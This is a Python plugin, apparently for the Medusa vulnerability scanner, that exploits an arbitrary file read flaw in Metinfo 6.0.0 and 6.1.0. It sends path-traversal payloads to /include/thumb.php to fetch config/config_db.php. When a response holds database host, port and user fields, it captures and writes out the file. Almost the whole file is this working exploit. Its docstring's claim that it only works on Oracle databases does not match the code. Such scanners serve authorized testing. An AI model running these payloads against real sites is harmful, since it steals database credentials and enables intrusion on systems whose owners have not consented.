#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
注意！只能对oracle数据库起作用
'''
__author__ = 'Ascotbe'
__times__ = '2019/10/13 22:12 PM'
import requests
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date']  = "2019-12-23"  # 插件编辑时间
        self.info['disclosure']='2018-5-26'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "MetinfoArbitraryFileReadVulnerability"  # 插件名称
        self.info['name'] ='Metinfo任意文件读取漏洞' #漏洞名称
        self.info['affects'] = "Metinfo"  # 漏洞组件
        self.info['desc_content'] = "old_thumb.class.php文件存在任意文件读取漏洞。攻击者可利用漏洞读取网站上的敏感文件"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "升级最新Metinfo版本"  # 修复建议
        self.info['version'] = "6.0.0版本和6.1.0版本"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def medusa(**kwargs)->None:
    url = kwargs.get("Url")  # 获取传入的url参数
    Headers = kwargs.get("Headers")  # 获取传入的头文件
    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
    payloads = ['..././http/..././config/config_db.php', '.....///http/.....///config/config_db.php',
                    'http\..\..\config\config_db.php', ]
    for payload in payloads:
        try:
            payload_url = url + '/include/thumb.php?dir=' + payload


            resp = requests.get(payload_url, headers=Headers, proxies=proxies,timeout=6,  verify=False)
            con = resp.text
            code = resp.status_code
            if code== 200 and con.find('con_db_host') != -1 and con.find('<?php') != -1 and con.find('con_db_por') != -1 and con.find('con_db_id') != -1:
                Medusa = "{}存在Metinfo任意文件读取漏洞\r\n 漏洞地址:\r\n{}\r\n漏洞详情:\r\n{}".format(url,payload_url,con)
                _t=VulnerabilityInfo(Medusa)
                ClassCongregation.VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
                ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
        except Exception as e:
            _ = VulnerabilityInfo('').info.get('algroup')
            ClassCongregation.ErrorHandling().Outlier(e, _)
            _l = ClassCongregation.ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类